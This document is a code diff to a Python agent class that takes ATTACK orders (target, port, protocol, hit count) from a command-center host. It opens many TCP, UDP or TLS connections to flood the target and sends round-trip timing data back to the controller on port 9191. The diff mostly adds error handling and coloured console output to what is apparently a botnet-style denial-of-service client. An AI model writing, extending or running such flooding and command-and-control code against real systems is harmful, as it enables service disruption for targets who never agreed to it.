@@ -72,23 +72,25 @@ class AgentInstance:
         
        
         while message:
-            print("Checking for message logic")
             # Attack the target if there is an attack instruction
             if "ATTACK" in message and self.COMMAND_CENTER:
                 message = message["ATTACK"]
                 #print(f"\033[1;95mInstructed to attack '{message['TARGET'].upper()}' on protocol: '{message['PROTOCOL'].upper()}' * '{message['HITS']}' times. Cipher: {message['CIPHER']}")
-
-                # Start the attack function with a valid IP / PORT / PROTOCOL / HIT amount and the connection instance to report back metrics to the master
-                rtt_data = self.attack(PROTOCOL=message['PROTOCOL'], IP=message['TARGET'], PORT=message['PORT'], HITS=message['HITS'])
-
+                try:
+                    # Start the attack function with a valid IP / PORT / PROTOCOL / HIT amount and the connection instance to report back metrics to the master
+                    rtt_data = self.attack(PROTOCOL=message['PROTOCOL'], IP=message['TARGET'], PORT=message['PORT'], HITS=message['HITS'])
+                except Exception as e:
+                    print("\033[1;31mERROR: Could not start attack: ", e)
+                    break
                 # Send the RTT Data back to the command center for processing
                 try:
-                    print(f"Sending RTT data to Command Center: {rtt_data}")
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        s.connect((self.COMMAND_CENTER, 9191))
-                        rtt_data = json.dumps({"RTT": rtt_data})
-                        #send the RTT data list to the command center so it can be stored in the database
-                        s.sendall((rtt_data.encode()))
+                    if rtt_data:
+                        print(f"Sending RTT data to Command Center: {rtt_data}")
+                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                            s.connect((self.COMMAND_CENTER, 9191))
+                            rtt_data = json.dumps({"RTT": rtt_data})
+                            #send the RTT data list to the command center so it can be stored in the database
+                            s.sendall((rtt_data.encode()))
                 except Exception as e:
                     print("ERROR could not send RTT data to command center: ", e)
                     break
@@ -100,19 +102,19 @@ class AgentInstance:
                 break
 
     def attack(self, IP, PORT, HITS, PROTOCOL="TCP", data=b"Attack Message", CIPHER="ECDHE-ECDSA-AES128-GCM-SHA256", SSLCONTEXT=ssl.PROTOCOL_TLSv1_2):
-        print("Initiating attack function")
-        print("Target:", str(IP))
-        print("Port:", str(PORT))
-        print("Protocol:", str(PROTOCOL))
-        print("Cipher:", str(CIPHER))
-        print("TLS Version:", str(SSLCONTEXT))
-        print("Hits:", str(HITS))
+        print("\033[1;33mInitiating attack function on:")
+        print("\033[1;33mTarget:", f"\033[1;32m{str(IP)}")
+        print("\033[1;33mPort:", f"\033[1;32m{str(PORT)}")
+        print("\033[1;33mProtocol:", f"\033[1;32m{str(PROTOCOL)}")
+        print("\033[1;33mCipher:", f"\033[1;32m{str(CIPHER)}")
+        print("\033[1;33mTLS Version:", f"\033[1;32m{str(SSLCONTEXT)}")
+        print("\033[1;33mHits:", f"\033[1;32m{str(HITS)}")
         # list for storing the sockets
         _sockets = []
         # list for storing the roundtriptimes whom we send back to the command center
         _RTT = []
         # Append the RTT list with the IP of the source machine for data handling
-        _RTT.append(self.LOCAL_IP)
+        #_RTT.append(self.LOCAL_IP)
 
         # Check protocol and assign either to TCP or UDP
         for i in range(int(HITS)):
@@ -131,9 +133,8 @@ class AgentInstance:
 
         # For the specified amount of hits, open a connection and send data
         for s in _sockets:
-            s.connect((IP, int(PORT)))
             try:
-
+                s.connect((IP, int(PORT)))
                 # Send data to target and start timer
                 start_time = time.time()
                 s.sendall(data)
@@ -152,9 +153,13 @@ class AgentInstance:
             # If connection is closed by target, retry
             except socket.error as e:
                 if e.errno == 104:
-                    print("Connection reset by target, retrying to send data..")
+                    print("\033[1;95mConnection reset by target, retrying to send data..")
                     # resending data to target
                     s.sendall(data)
+                else:
+                    print("\033[1;95mERROR: Could not send data to target: ", e)
+                    _RTT = None
+                    break
         # Return all the roundtrip time data to send to the command center
         return (_RTT)
 
